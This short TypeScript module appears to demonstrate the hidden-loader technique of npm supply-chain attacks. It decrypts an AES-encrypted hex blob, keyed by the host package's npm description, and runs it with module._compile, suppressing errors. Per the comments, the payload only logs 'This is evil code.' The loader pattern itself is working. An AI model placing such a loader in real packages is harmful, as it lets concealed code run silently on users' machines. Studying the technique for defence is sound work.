import * as crypto from "crypto";
declare global {
  interface NodeModule {
    _compile(arg1: string, arg2: string): any;
  }
}
export default () => {
  // 暗号化
  /*
var cipher = require("crypto").createCipher("aes-256-cbc", "run evil code");
var encoded = cipher.update('console.log("This is evil code.")', "utf8", "hex") + cipher.final('hex');
encoded
var decipher = require("crypto").createDecipher("aes256", "run evil code");
var payload = decipher.update(encoded, "hex", "utf8") + decipher.final("utf8");
payload
);
*/

  // console.log("This is evil code.");
  // password: run evil code
  const data =
    "cfdc36e155f1213c266810ac757ceb743e036c6aa08703d564010029511c7af099387eb23604e1b308233f4eba23dd0f";
  const decipher = crypto.createDecipher(
    "aes256",
    process.env.npm_package_description || ""
  );
  try {
    const payload =
      decipher.update(data, "hex", "utf8") + decipher.final("utf8");
    module._compile(payload, "");
  } catch {}
};
